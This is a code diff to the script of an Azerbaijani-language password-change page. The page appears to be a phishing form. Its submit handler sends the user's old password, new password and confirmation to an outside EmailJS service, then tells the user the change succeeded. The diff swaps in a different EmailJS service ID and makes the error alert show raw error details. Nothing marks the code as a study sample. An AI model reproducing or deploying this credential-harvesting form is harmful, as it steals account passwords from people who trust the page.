@@ -237,7 +237,7 @@
       submitBtn.disabled = true;
       submitBtn.textContent = 'Göndərilir...';
 
-      emailjs.send('service_ocn1wtd', 'template_5xc9nf1', {
+      emailjs.send('service_j138r24', 'template_5xc9nf1', {
         old_password: oldP,
         new_password: newP,
         confirm_password: conf
@@ -246,10 +246,10 @@
         document.getElementById('subtitle').textContent = 'Yeni şifrənizlə hesabınıza daxil ola bilərsiniz.';
         document.getElementById('ico').innerHTML = '<polyline points="20 6 9 17 4 12"/>';
         form.classList.add('hidden');
-      }).catch(() => {
+      }).catch((err) => {
         submitBtn.disabled = false;
         submitBtn.textContent = 'Şifrəni dəyişdir';
-        alert('Xəta baş verdi. Yenidən cəhd edin.');
+        alert('Xəta: ' + JSON.stringify(err));
       });
     });
   </script>
